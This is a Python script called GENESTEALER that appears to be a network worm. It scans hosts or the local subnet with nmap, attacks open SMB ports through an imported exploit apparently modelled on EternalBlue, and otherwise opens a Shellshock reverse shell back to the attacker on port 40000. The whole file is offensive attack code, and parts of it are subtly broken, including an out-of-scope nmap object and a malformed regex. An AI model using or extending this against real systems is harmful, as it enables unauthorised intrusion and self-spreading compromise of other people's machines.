#!/usr/bin/env python3

import argparse
import pathlib
import re
from blue_you import exploit
from ipaddress import ip_address, ip_network
from pprint import pprint
from scanner import scanner
from shocker import shockshell
from subprocess import check_output

# SMB ports are 139 & 445, so look for 3 digit open ports
smb_finder = re.compile("([0-9]{3}\/tcp)\s+(open)")
# Shellshock needs port 80, so look for a 2 digit port thats open
web_finder = re.compile("([0-9]{2}\/tcp)\s+(open)")

def attack(ip):
    print("Scanning target with nmap...")
    vic_info = nmap.identify_ports(str(ip))
    pprint(vic_info)
    if len(smb_finder.findall(vic_info)) == 2:
        # Don't need to check what ports are since we only scan for 3
        print(f"Smb ports running on {ip}!!")
        # Run smbclient to enumerate pipes
        pipe_detector = re.compile('(A-z)+')
        smbclient_cmd = ['smbclient', '-L', f'\\\\{ip}']
        smbclient_cmd_alt = ['/tmp/.smbclient', '-L', f'\\\\{ip}']
        try:
            pipe_names = check_output(smbclient_cmd)
        except:
            pipe_names = check_output(smbclient_cmd_alt)
        finally:
            pipes = pipe_detector.findall(pipe_names)
        for pipe in pipes:
            try:
                exploit(ip, pipe)
            except:
                continue
    elif len(web_finder.findall(vic_info)) == 1:
        print(f"Web server found running on {ip}!!")
        shockshell('reverse', ip, 40000, nmap.get_self_ip())
    else:
        print("Necessary ports not found on target")
        print(f"Attack on {ip} failed :(")

def main():
    parser = argparse.ArgumentParser(prog="GENESTEALER")
    parser.add_argument('mode',
                        choices=["manual", "auto"],
                        help="Whether to expect specified targets or not")
    parser.add_argument('--target',
                        action='extend',
                        nargs='+',
                        help="Initial target for worm (only for manual attack mode)",
                        type=ip_address)

    args = parser.parse_args()

    if args.mode == 'manual' and args.target is None:
        parser.error("Manual mode specified but no target given!")
    else:
        nmap = scanner()
        if args.mode == 'manual':
            for victim in args.target:
                print(f"Manual attack started against {victim}")
                attack(victim)
        else:
            print("Auto attack against network")
            curr_box = nmap.get_self_ip()
            print("Identifying targets...")
            victims = nmap.ping_scan(curr_box)
            for victim in victims:
                attack(victim)

if __name__ == '__main__':
    main()
